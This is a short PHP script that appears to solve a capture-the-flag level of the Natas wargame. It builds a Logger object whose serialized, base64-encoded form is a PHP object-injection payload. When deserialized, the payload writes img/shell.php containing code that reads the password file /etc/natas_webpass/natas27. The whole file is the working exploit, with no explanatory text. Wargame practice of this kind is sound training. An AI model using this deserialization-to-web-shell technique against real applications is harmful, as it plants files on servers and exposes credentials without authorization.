<?php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct(){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27')?>";
        $this->logFile = "img/shell.php";

        // write initial message
        // $fd=fopen($this->logFile,"a+");
        // fwrite($fd,$initMsg);
        // fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        ;
    }
}
$logger = new Logger;
echo serialize($logger);
echo base64_encode(serialize($logger));
?>